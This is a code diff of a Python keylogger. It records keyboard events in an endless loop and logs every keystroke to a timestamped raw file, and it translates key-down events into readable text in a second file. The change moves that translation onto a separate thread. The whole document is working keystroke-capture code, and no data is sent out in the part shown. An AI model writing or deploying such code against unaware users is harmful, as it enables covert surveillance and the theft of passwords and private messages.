@@ -1,6 +1,10 @@
-from lib import keyboard    
-from datetime import datetime   
-import os   
+from lib import keyboard
+from datetime import datetime
+import os
+import threading
+
+#gloabl var
+
 
 def checkLogsPath(path):
     if os.path.exists(path) == False:
@@ -19,43 +23,45 @@ def writeToFileRaw(lPath, lName, l):
     newLog.write(str(l))
     newLog.close()
 
-def writeToFileText(lPath, lName, l):
+def writeToFileHuman(strh, lPath, lName):
+    if strh.find("down") != -1:
+        if strh.find("space") != -1:
+            strh = " "
+        elif strh.find("enter") != -1:
+            strh = "\n"
+        elif strh.find("maiusc") != -1:
+            strh = ""
+        elif strh.find("ctrl") != -1:
+            strh = " [CTRL] "
+        elif strh.find("esc") != -1:
+            strh = " [ESC] "
+        elif strh.find("stamp") != -1:
+            strh = " [STAMP] "
+        elif strh.find("bloc maius") != -1:
+            strh = " [MAIUSCOLO] "
+        else:
+            strh = strh.removeprefix("KeyboardEvent(")
+            strh = strh.removesuffix(" down)\n")
+    else:
+        return 0
     newLog = open(lPath + lName, "a")
-    newLog.write(str(l))
+    newLog.write(strh)
     newLog.close()
-def main():
 
+def main():
     tempLogName = calcualteDataAndHour()
     logsPath = "logs/"
-
     checkLogsPath(logsPath)
 
     while True:
-        skip = False
         tempLog = recording()
-        strTempLogRaw = str(tempLog)
-        strTempLog = ""
+        strh = str(tempLog)
 
-        if strTempLogRaw.find("down") != -1:
-            if strTempLogRaw.find("space") != -1:
-                strTempLog = " "
-            elif strTempLogRaw.find("enter") != -1:
-                strTempLog = "\n"
-            elif strTempLogRaw.find("maiusc") != -1:
-                strTempLog = ""
-            elif strTempLogRaw.find("ctrl") != -1:
-                strTempLog = " [CTRL] "
-            elif strTempLogRaw.find("esc") != -1:
-                strTempLog = " [ESC] "
-            elif strTempLogRaw.find("stamp") != -1:
-                strTempLog = " [STAMP] "
-            elif strTempLogRaw.find("bloc maius") != -1:
-                strTempLog = " [MAIUSCOLO] "
-            else:
-                strTempLog = strTempLogRaw.removeprefix("KeyboardEvent(")
-                strTempLog = strTempLog.removesuffix(" down)")
-        writeToFileRaw(logsPath,tempLogName+".raw",strTempLogRaw + "\n")
-        writeToFileText(logsPath, tempLogName+".txt",strTempLog)
+        writeToFileRaw(logsPath,tempLogName+".raw",strh + "\n")
+
+        thread_write_human = threading.Thread(target=writeToFileHuman, args=(strh + "\n", logsPath, tempLogName+".txt"))
+        thread_write_human.start()
+
 
 
 #########################
